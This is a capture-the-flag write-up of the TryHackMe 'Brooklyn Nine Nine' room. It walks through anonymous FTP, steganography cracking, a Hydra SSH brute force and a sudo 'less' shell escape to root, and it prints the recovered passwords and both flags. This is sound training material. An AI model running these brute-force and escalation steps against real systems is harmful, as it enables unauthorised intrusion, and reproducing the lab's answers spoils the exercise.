---
title: "Brooklyn Nine Nine: Following Two Leads to Root"
date: 2026-02-28 09:00:00 +0300
category: cybersecurity
subcategories:
  - ctf
  - credential-access
  - privilege-escalation
tags:
  - CTF
  - TryHackMe
  - FTP
  - SSH
  - Hydra
  - Privilege Escalation
type: technical-breakdown
summary: "Two parallel leads, one from the website and one from anonymous FTP, converge into SSH access and a clean sudo path to root."
featured: false
---

Machine: [TryHackMe - Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)

## Introduction

A room named *Brooklyn Nine Nine* was always likely to lean into the theme a little, and this one did. The host was not difficult in a technical sense, but it was structured around a few small clues that were easy to miss if I treated enumeration as a checklist instead of paying attention to context.

What made the box work for me was that I did not commit too early to a single path. One lead came from the website and ended with valid credentials for Holt. The other came from anonymous FTP, which exposed Jake as a weak SSH target and eventually gave me the cleanest route to root.

## Initial Enumeration

I started with a full TCP scan to see the exposed surface before deciding where to spend time.

```bash
nmap -sC -sV -p- -T4 TARGET_IP
```

```text
21/tcp open  ftp   vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed
|_-rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt

22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http  Apache httpd 2.4.29 ((Ubuntu))
```

That gave me three obvious areas to check: FTP, SSH, and a small Apache site. The anonymous FTP listing stood out immediately because it exposed a note addressed to Jake, which strongly suggested a valid username before I had even authenticated anywhere.

I also spent a little time on the web server to see whether it hid anything beyond the homepage. That did not go very deep at first.

```bash
curl http://TARGET_IP/robots.txt
```

```text
404 Not Found
```

```bash
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
```

```text
/.htaccess            (Status: 403)
/.hta                 (Status: 403)
/.htpasswd            (Status: 403)
/index.html           (Status: 200)
/server-status        (Status: 403)
```

There was not much there. The website did not initially look like something worth spending a lot of time brute forcing, so I kept it in scope but moved to the leads that were already giving me names and content.

## Anonymous FTP and a Weak SSH Target

Since anonymous access was allowed, I connected and pulled down the note.

```bash
ftp TARGET_IP
```

```bash
get note_to_jake.txt
```

```bash
cat note_to_jake.txt
```

```text
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

That note did two useful things at once. It gave me a likely username, `jake`, and it reduced the guesswork around next steps. At that point, password reuse or a weak SSH password was no longer a vague possibility. It was something the machine was practically pointing at.

I did not move on SSH immediately, though, because the homepage had also given me a clue that looked deliberate.

## The Website and the Holt Branch

Pulling the homepage source revealed a hidden comment:

```bash
curl http://TARGET_IP
```

```text
<!-- Have you ever heard of steganography? -->
```

That was enough to make the image on the page worth checking. I downloaded it and tested the obvious route instead of trying to overcomplicate the web side.

```bash
wget http://TARGET_IP/brooklyn99.jpg
stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

```text
[i] Found passphrase: "admin"
[i] Original filename: "note.txt"
[i] Extracting to "brooklyn99.jpg.out"
```

The extracted content gave me a password for Holt:

```bash
cat brooklyn99.jpg.out
```

```text
Holts Password:
fluffydog12@ninenine
```

With that, I could authenticate directly over SSH.

```bash
ssh holt@TARGET_IP
```

Once inside Holt's account, I recovered the user flag:

```bash
cat user.txt
```

```text
ee11cbb19052e40b07aac0ca060c23ee
```

This branch mattered because it confirmed that the website clue was real and led to a working account, not just flavor text. Still, after getting access as Holt, it was not yet clear that this was the best way to finish the box. The FTP note about Jake still looked relevant, especially since weak credentials often lead to a cleaner privilege escalation path than the first foothold does.

## Returning to Jake

With the FTP message in mind, I went back to the second branch and tested SSH against Jake with `rockyou.txt`.

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP -t 4
```

```text
[22][ssh] host: TARGET_IP   login: jake   password: 987654321
```

That gave me a second valid shell:

```bash
ssh jake@TARGET_IP
```

Getting Holt had already proved that I could land on the box, but Jake now looked like the more useful account to explore further. At that stage I had two user contexts, and the next decision was simply which one exposed a more practical escalation route.

## Privilege Escalation

From Jake's shell, I checked sudo permissions.

```bash
sudo -l
```

```text
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

That was the clearest escalation path I had seen so far. `less` is harmless only until it is allowed under `sudo` without restrictions. Since it supports shell escapes, it can be used to break out into a root shell.

I opened a readable file with `less` under `sudo`:

```bash
sudo less /etc/profile
```

Then escaped to a shell from inside `less`:

```bash
!/bin/sh
```

From there I verified the context and read the root flag.

```bash
whoami
cd /root
ls
cat root.txt
```

```text
root

root.txt

-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845
```

That closed the machine through the Jake branch. Holt had provided a valid foothold and the user flag, but Jake was the path that completed the compromise cleanly.

## Conclusion

The box came down to a short chain of small problems that worked well together: anonymous FTP exposed internal information, that information identified a weak SSH target, the website hid another set of valid credentials through steganography, and a careless sudo rule on `less` finished the job.

What I liked about this machine was that it rewarded parallel validation more than noisy enumeration. The broad web checks did not give me much, but a single comment in the page source was worth more than a longer list of empty directories. In the same way, the FTP note was more useful than it looked at first because it narrowed the attack surface to a specific user and a likely weakness. That is usually the better way to move through a box like this: keep multiple leads alive, give more weight to small clues with context, and let each one earn more time before going deeper.
